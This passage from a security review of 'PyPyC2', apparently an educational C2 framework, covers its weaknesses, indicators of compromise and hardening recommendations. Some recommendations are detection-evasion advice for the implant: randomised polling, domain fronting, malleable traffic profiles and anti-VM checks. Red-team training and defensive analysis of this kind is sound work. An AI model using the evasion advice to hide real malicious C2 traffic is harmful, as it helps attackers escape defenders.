❌ **No Agent Authentication**:
- Any client can join as agent
- No way to verify agents are legitimate
- Rogue agents could poison C2

❌ **No Command Signing**:
- Agents blindly trust commands from server
- MITM could inject malicious commands

❌ **CORS Wide Open** (`allow_origins=["*"]`):
- Any website can make requests
- XSS on any site could access C2 API

---

### Payload Protection

#### Token Rotation System

**How it works**:
1. Background thread generates new token every 5 minutes
2. Launcher endpoint validates token before serving
3. Old URLs become invalid after rotation

**Effectiveness**:
✅ Prevents static URL sharing
✅ Limits automated scraping
⚠️ **But**: 5-minute window is still exploitable
❌ Agent download endpoint (`/payload/allinone.py`) has **NO protection**

---

### Input Validation

#### File Operations
✅ **Path Traversal Prevention**: `Path(filename).name` sanitizes
✅ **Size Limits**: 100MB prevents resource exhaustion
✅ **Agent Isolation**: Separate directories per agent

❌ **No File Type Restrictions**: Could upload executables, scripts
❌ **No Malware Scanning**: Uploaded files not checked
❌ **No Access Control**: Agents can't access each other's files (good) but no verification

#### Command Execution
❌ **No Sanitization**: Commands passed directly to PowerShell
❌ **Full Shell Access**: Agent has all privileges of user context
❌ **No Command Whitelisting**: Any command can be executed

---

### Data Persistence

#### In-Memory Storage
✅ **Fast**: No database overhead
✅ **Simple**: No complex queries or schemas

❌ **Volatile**: Agents lost on server restart
❌ **No Audit Trail**: No logs of past agents or commands
❌ **No Backup**: Data cannot be recovered
❌ **Session Loss**: All users logged out on restart

**Recommendation**: Add optional SQLite/PostgreSQL for persistence

---

### Agent Detection Risk

#### Indicators of Compromise (IOCs)

**Network**:
- Predictable polling interval (no jitter)
- HTTP traffic (not HTTPS)
- Regular GET requests to `/agent/get_commands/{id}`
- JSON-formatted C2 traffic

**Host**:
- PowerShell spawning Python
- Python process with network connections
- In-memory execution (harder to detect)
- No persistence mechanism (won't survive reboot)

**Behavioral**:
- Regular outbound HTTP requests
- Python installed silently (via launcher)
- PowerShell downloading and executing remote code

---

### Recommendations

#### High Priority
1. **Add TLS/HTTPS**: Encrypt all traffic
2. **Agent Authentication**: Require pre-shared keys or certificates
3. **Command Signing**: Use HMAC or digital signatures
4. **Change Default Password**: Force password change on first login
5. **Add Jitter**: Randomize polling intervals (e.g., 3-7s instead of exactly 5s)

#### Medium Priority
6. **Add Persistence**: Optional database backend
7. **Audit Logging**: Log all commands, logins, file operations
8. **Rate Limiting**: Prevent brute force attacks
9. **Multi-User Support**: Multiple operators with different roles
10. **IP Whitelisting**: Only allow agents from expected ranges

#### Low Priority
11. **Encrypted C2 Traffic**: Custom encryption layer (beyond TLS)
12. **Domain Fronting**: Hide C2 behind CDN
13. **Malleable Profiles**: Customize traffic patterns
14. **Anti-VM Detection**: Check for sandboxes before running

---

## Conclusion

PyPyC2 is a **well-architected educational C2 framework** demonstrating:
- Modern web technologies (FastAPI, React, TypeScript)
- Clean code structure and separation of concerns
- Rich feature set (9 command types, file manager, terminal)
- Polished user interface with auto-refresh

**Best suited for**:
✅ Red team training
✅ Security research
✅ Understanding C2 mechanics
✅ Learning FastAPI and React

**Not suitable for**:
❌ Production operations (no encryption)
❌ Long-term campaigns (no persistence)
❌ Multi-operator teams (single user)
❌ Evasion-focused ops (detectable patterns)

**Educational Value**: Excellent for understanding how modern C2s work, but needs significant hardening for real-world use.
